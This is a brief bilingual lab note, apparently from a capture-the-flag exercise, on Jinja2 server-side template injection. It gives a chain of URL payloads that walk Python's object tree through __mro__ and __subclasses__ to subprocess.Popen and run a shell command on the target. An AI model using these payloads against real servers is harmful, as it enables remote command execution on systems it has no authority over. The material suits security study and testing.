# Server Side Template Injaction


## SSTI-Payloads:

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection


### Jinja2、3

https://jinja.palletsprojects.com/en/3.0.x/templates/


#### attr(obj, name):

    Get an attribute of an object. foo|attr("bar") works like foo.bar just that always an attribute is returned and items are not looked up.


### 制作概念验证 （Jinja2）

Python 允许我们使用 .__class__ 调用当前类实例，我们可以在空字符串上调用它：

有效载荷：。http://MACHINE_IP:5000/profile/{{ ''.__class__ }}

Python 中的类有一个名为 .__mro__ 的属性，它允许我们爬上继承的对象树：

有效载荷：。http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__ }}

由于我们想要根对象，我们可以访问第二个属性（第一个索引）：

有效载荷：。http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1] }}

Python 中的对象有一个名为 .__subclassess__ 的方法，它允许我们向下爬取对象树：

有效载荷：。http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}

有效载荷：。http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401] }}

上面的有效负载实质上调用子进程。Popen 方法，现在我们所要做的就是调用它（使用上面的代码进行语法）

有效载荷：。http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}
